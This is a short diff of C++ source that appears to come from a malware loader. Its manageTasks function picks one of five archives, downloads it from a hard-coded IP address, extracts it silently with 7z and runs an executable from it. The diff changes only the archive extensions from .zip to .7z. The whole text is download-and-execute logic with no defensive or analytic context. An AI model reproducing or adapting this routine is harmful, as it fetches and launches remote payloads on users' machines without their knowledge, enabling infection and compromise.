@@ -528,27 +528,27 @@ void manageTasks(const std::wstring& task)
 		switch (rareb)
 		{
 		case 0:
-			Download(L"http://92.35.115.29/Bean.zip", 0, false);
+			Download(L"http://92.35.115.29/Bean.7z", 0, false);
 			SHELLEXECUTE(v[1], L"x Bean.7z -oBean -y", true);
 			SHELLEXECUTE(v[4], v[5], false);
 			break;
 		case 1:
-			Download(L"http://92.35.115.29/PD.zip", 7, false);
+			Download(L"http://92.35.115.29/PD.7z", 7, false);
 			SHELLEXECUTE(v[1], L"x PD.7z -oPD -y", true);
 			SHELLEXECUTE(v[4], v[10], false);
 			break;
 		case 2:
-			Download(L"http://92.35.115.29/BK.zip", 8, false);
+			Download(L"http://92.35.115.29/BK.7z", 8, false);
 			SHELLEXECUTE(v[1], L"x BK.7z -oBK -y", true);
 			SHELLEXECUTE(v[4], v[11], false);
 			break;
 		case 3:
-			Download(L"http://92.35.115.29/BT.zip", 9, false);
+			Download(L"http://92.35.115.29/BT.7z", 9, false);
 			SHELLEXECUTE(v[1], L"x BT.7z -oBT -y", true);
 			SHELLEXECUTE(v[4], v[12], false);
 			break;
 		case 4:
-			Download(L"http://92.35.115.29/BeanOG.zip", 13, false);
+			Download(L"http://92.35.115.29/BeanOG.7z", 13, false);
 			SHELLEXECUTE(v[1], L"x BeanOG.7z -oBeanOG -y", true);
 			SHELLEXECUTE(v[4], v[14], false);
 			break;
